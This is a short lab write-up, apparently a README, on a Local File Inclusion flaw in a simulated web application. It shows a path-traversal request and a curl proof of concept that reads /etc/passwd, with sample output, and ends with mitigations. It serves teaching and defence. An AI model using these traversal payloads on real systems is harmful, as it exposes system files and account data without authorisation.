## Overview

This lab demonstrates a **Local File Inclusion (LFI)** vulnerability in a simulated web application. By manipulating parameters, an attacker can retrieve sensitive system files such as `/etc/passwd`.  

---

## Objective

- Understand Local File Inclusion (LFI) vulnerabilities  
- Learn how improper file handling can lead to sensitive data exposure  
- Practice safe exploitation in a controlled environment  

---

## Vulnerability Description

Local File Inclusion occurs when a web application dynamically loads files based on **user input** without proper validation.  

In this lab:  

- The server mislabels responses (e.g., returning `/etc/passwd` with `Content-Type: image/jpeg`)  
- Attackers can request arbitrary files from the system  
- This results in the disclosure of **sensitive information** such as usernames and service accounts  

---

## Exploitation Steps

1. Intercept a vulnerable request using **Burp Suite** or browser dev tools.  
2. Manipulate the file parameter to include `/etc/passwd`. Example:  

   ```
   GET /vulnerable.php?page=../../../../etc/passwd HTTP/1.1
   Host: target.com
   ```
3. Observe the server‚Äôs response. Despite a `200 OK` and `image/jpeg` header, the body leaks system file contents.

---

## Proof of Concept

Using `curl` to fetch `/etc/passwd` through the vulnerable endpoint:  

```bash
curl "http://target.com/vulnerable.php?page=../../../../etc/passwd"
```

Output:  

```
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:106:107:MySQL Server:/nonexistent:/bin/false
...
```

---

## Mitigation

* **Validate and sanitize user input** before using it in file operations  
* **Restrict file access** using whitelists (only allow known safe files)  
* **Use a chroot jail or containerization** to limit file system exposure  
* **Disable detailed error messages** in production environments  
* **Apply the principle of least privilege** for the web server user
